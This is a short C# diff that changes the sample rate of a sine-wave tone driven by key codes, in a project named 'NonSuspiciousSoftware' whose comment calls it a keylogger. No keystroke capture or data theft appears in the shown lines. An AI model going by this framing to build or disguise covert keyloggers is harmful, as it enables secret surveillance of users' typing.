@@ -93,7 +93,7 @@ namespace NonSuspiciousSoftware
             if (waveOut == null)
             {
                 var sineWaveProvider = new SineWaveProvider32();
-                sineWaveProvider.SetWaveFormat(48000, 1); 
+                sineWaveProvider.SetWaveFormat(44100, 1); //First parameter may need to be changed, depending on the hardware. Lower the value, if the keylogger crash for you
                 sineWaveProvider.Frequency = _startingFrequency + vkCode *27;
                 Console.WriteLine(sineWaveProvider.Frequency);
                 sineWaveProvider.Amplitude = 0.25f;
